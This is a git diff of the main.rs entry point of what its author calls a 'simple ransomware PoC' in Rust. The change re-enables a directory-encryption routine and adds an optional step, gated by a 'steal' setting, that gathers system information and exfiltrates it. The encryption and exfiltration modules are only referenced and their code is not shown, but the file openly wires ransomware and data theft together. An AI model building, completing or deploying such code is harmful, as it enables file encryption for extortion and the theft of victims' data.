@@ -1,28 +1,28 @@
 use std::env;
 use std::process;
-mod settings;
 mod encryption_functions;
-mod tests;
-mod infograb_functions;
 mod exfiltration_functions;
-use crate::settings::Config;
+mod infograb_functions;
+mod settings;
 use crate::encryption_functions::iterate_dir;
+use crate::settings::Config;
 fn main() {
-   /*  let args: Vec<String> = env::args().collect();
+    let args: Vec<String> = env::args().collect();
     let mut config: Config = Config::new(args).unwrap_or_else(|err| {
         eprintln!("Syntax error: {}", err);
         process::exit(1);
-        
     });
     style();
-    iterate_dir(&mut config); */
-    println!("Trying to get info");
-    let result = infograb_functions::get_info();
-    println!("{:?}", result);
-    let resp = exfiltration_functions::exfiltrate_infos(result);
-    match resp {
-        Ok(_) => println!("Success"),
-        Err(e) => eprintln!("Error: {}", e),
+    iterate_dir(&mut config);
+    if config.steal() {
+        println!("Trying to get info");
+        let result = infograb_functions::get_info();
+        println!("{:?}", result);
+        let resp = exfiltration_functions::exfiltrate_infos(result);
+        match resp {
+            Ok(_) => println!("Success"),
+            Err(e) => eprintln!("Error: {}", e),
+        }
     }
 }
 fn style() {
@@ -31,4 +31,3 @@ fn style() {
     println!("---------------------------------------");
     println!("Simple ransomware PoC because I'm currently learning Rust and I figured why not!");
 }
-
